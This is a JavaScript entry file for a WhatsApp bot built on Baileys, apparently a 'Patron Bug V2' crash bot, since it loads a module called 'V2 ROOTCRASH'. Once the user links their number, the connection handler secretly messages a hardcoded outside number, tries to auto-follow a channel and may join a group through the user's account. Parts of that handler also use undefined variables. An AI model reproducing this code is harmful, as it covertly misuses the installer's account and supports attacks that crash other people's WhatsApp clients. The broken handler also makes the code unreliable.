require("./database/global")
const func = require("./database/place")
const readline = require("readline");
const usePairingCode = true
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
return new Promise((resolve) => {
rl.question(text, resolve)
})
};
async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()
console.log(chalk.yellow.bold('HEYY'))
const connectionOptions = {
version,
keepAliveIntervalMs: 30000,
printQRInTerminal: !usePairingCode,
logger: pino({ level: "fatal" }),
auth: state,
browser: [ "Ubuntu", "Chrome", "20.0.04" ]
// browser: ['Chrome (Linux)', '', '']
}
const PannOfficiaL = func.makeWASocket(connectionOptions)
if(usePairingCode && !PannOfficiaL.authState.creds.registered) {
const phoneNumber = await question(chalk.green('\nEnter Your Number\nNumber : '));
const code = await PannOfficiaL.requestPairingCode(phoneNumber.trim())
console.log(chalk.green(`Your Pairing Code : ${code} `))
}
store.bind(PannOfficiaL.ev)
PannOfficiaL.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
PannOfficiaL.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
PannOfficiaL.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
start(`1`, `Connecting...`)
} else if (connection === "open") {
success(`1`, `connected`)
PannOfficiaL.sendMessage(`2348133729715@s.whatsapp.net`, { text: `★彡[ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ ᴘᴀᴛʀᴏɴ ʙᴜɢ ᴠ2 🚹]彡★

🚹 PLEASE FOLLOW CHANNEL 🚹

 https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q`})

 let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q')[1] : text.split('https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q')[1]
let res = await Sky.newsletterMetadata("invite", result)
await Sky.newsletterFollow(res.id)

if (autoJoin) {
PannOfficiaL.groupAcceptInvite(codeInvite)
}
}
})
PannOfficiaL.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return PannOfficiaL.readMessages([m.key])
if (!PannOfficiaL.public && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
m = func.smsg(PannOfficiaL, m, store)
require("./V2 ROOTCRASH")(PannOfficiaL, m, store)
} catch (err) {
console.log(err)
}
})
PannOfficiaL.ev.on('contacts.update', (update) => {
for (let contact of update) {
let id = PannOfficiaL.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})
PannOfficiaL.public = true
PannOfficiaL.ev.on('creds.update', saveCreds)
return PannOfficiaL
}
startSesi()
process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
